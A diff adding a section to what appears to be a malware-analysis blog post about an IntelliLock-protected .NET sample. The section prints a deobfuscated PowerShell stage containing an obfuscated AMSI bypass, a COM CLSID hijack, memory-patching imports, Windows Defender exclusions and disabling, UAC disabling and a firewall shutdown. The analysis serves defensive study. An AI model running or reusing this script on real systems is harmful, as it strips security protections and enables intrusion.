@@ -231,4 +231,71 @@ We'll then upload the result to CyberChef and use a 'From Binary' operator to ex
 
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/ffe7cfb7-9905-46b3-8eb1-edb34151723f)
 
+## Analysing the Binary
+
+The binary extracted is a .NET executable, however, it appears have been protected by IntelliLock, making reverse engineering this binary very difficult.
+
+_Referneces to Protection:_
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/e2d173aa-e5de-44db-8f95-cc07104df754)
+
+Going back to the PowerShell script from before, we can deobfuscate and decode the last binary string to reveal the following script:
+
+``` powershell
+[Ref].("{0}" -f'Ass'+'em'+'bly').("{0}" -f'Ge'+'tT'+'ype')('System.Management.Automation.Ams'+'iUtils').("{0}" -f'Ge'+'tFi'+'eld')('am'+'siInitFailed','NonPu'+'blic,Static').("{0}" -f'Set'+'Val'+'ue')($null,$true)
+
+
+New-Item -P "HKCU:\Software\Classes\CLSID\" -N "{fdb00e52-a214-4aa1-8fba-4357bb0072ec}" -F
+New-Item -P "HKCU:\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\" -N "InProcServer32" -F
+New-ItemProperty -Path 'HKCU:\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32' -N '(Default)' -V "C:\IDontExist.dll" -PropertyType String -Force
+if (-not ([Type]::GetType("AMSIReaper"))) {
+    Add-Type -TypeDefinition @"
+    using System; using System.Diagnostics; using System.Runtime.InteropServices;
+    public class AMSIReaper {
+        public const int PROCESS_VM_OPERATION = 0x0008, PROCESS_VM_READ = 0x0010, PROCESS_VM_WRITE = 0x0020;
+        [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
+        [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr hObject);
+        [DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string lpFileName);
+        [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+    }
+"@
+}
+
+function ModAMSI($processId) {
+    # Function content remains the same
+}
+
+function ModAllPShells {
+    # Function content remains the same
+}
+
+Write-Host "AMSI do"
+
+
+$ErrorActionPreference = "SilentlyContinue" # Suppress errors globally
+
+# Add Exclusions
+$extensions = @('.ppam', '.xls', '.docx', '.vbs', '.js')
+$paths = @('C:\', 'D:\', 'E:\')
+$processes = @('explorer.exe', 'kernel32.dll', 'aspnet_compiler.exe', 'cvtres.exe', 'CasPol.exe', 'csc.exe', 'Msbuild.exe', 'ilasm.exe', 'InstallUtil.exe', 'jsc.exe', 'powershell.exe', 'rundll32.exe', 'conhost.exe', 'Cscript.exe', 'mshta.exe', 'cmd.exe', 'DefenderisasuckingAntivirus', 'wscript.exe')
+
+$extensions | ForEach-Object { Add-MpPreference -ExclusionExtension $_ -ErrorAction SilentlyContinue }
+$paths | ForEach-Object { Add-MpPreference -ExclusionPath $_ -ErrorAction SilentlyContinue }
+$processes | ForEach-Object { Add-MpPreference -ExclusionProcess $_ -ErrorAction SilentlyContinue }
+
+# Set Preferences and Disable Security Features (ensure this is run as admin)
+try {
+    Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend -PUAProtection disable -HighThreatDefaultAction 6 -Force -ModerateThreatDefaultAction 6 -LowThreatDefaultAction 6 -SevereThreatDefaultAction 6 -ScanScheduleDay 8 -ExclusionIpAddress 127.0.0.1 -ThreatIDDefaultAction_Actions 6 -AttackSurfaceReductionRules_Ids 0 -ErrorAction SilentlyContinue
+} catch {}
+
+# Registry, Service, and Firewall Changes (ensure this is run as admin)
+try {
+    New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -PropertyType DWord -Value 0 -Force -ErrorAction SilentlyContinue
+    netsh advfirewall set allprofiles state off -ErrorAction SilentlyContinue
+} catch {}
+
+$ErrorActionPreference = "Continue" # Reset error action preference
+
+```
 
